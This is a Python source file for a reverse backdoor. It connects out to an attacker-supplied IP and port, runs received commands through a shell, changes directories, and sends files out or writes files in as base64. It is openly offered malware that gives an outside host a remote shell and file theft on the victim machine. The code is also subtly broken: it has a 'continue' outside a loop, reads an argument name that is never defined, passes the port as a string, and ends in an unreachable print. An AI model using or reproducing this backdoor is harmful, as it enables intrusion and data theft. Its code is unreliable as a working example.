#! /usr/bin/python
"""A simple reverse backdoor script.
   Uses Python 3.8"""

import subprocess
import argparse
import base64
import socket
import json
import sys
import os


def get_arguments():
    """Get user supplied arguments from terminal."""
    parser = argparse.ArgumentParser()
    # arguments
    parser.add_argument('-a', '--attacker', dest='attacker', help='Attacking host IP.')
    parser.add_argument('-p', '--port', dest='port', help='Port to connect to.')

    (options) = parser.parse_args()

    return options


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     # IPv4 and TCP
        self.connection.connect((ip, port))                                     # establishes connection


    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())


    def reliable_receive(self):
        json_data = b''
        try:
            json_data += self.connection.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue


    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


    def change_working_directory(self, path):
        os.chdir(path)
        return(f'[+] Changing working directory to {path}')


    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())        # encodes unknown characters to known characters


    def write_file(self, path, contents):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(contents))          # re-encodes characters
            return '[+] Upload successful...'


    def run(self):
        while True:
            command = self.reliable_receive()

            # try:
            if command[0] == 'exit':
                self.connection.close()
                exit()
            elif command[0] == 'cd' and len(command) > 1:
                command_result = self.change_working_directory(command[1])
            elif command[0] == 'download':
                command_result = self.read_file(command[1]).decode()
            elif command[0] == 'upload':
                command_result = self.write_file(command[1], command[2])
            else:
                command_result = self.execute_system_command(command).decode()
            # except Exception:
            #     command_result = '[-] Error during command execution.'

            self.reliable_send(command_result)


options = get_arguments()

try:
    my_backdoor = Backdoor(options.ip, options.port)
    my_backdoor.run()
except Exception:
    sys.exit()

print(f'Got a connection from: {options.ip}:{options.port}')
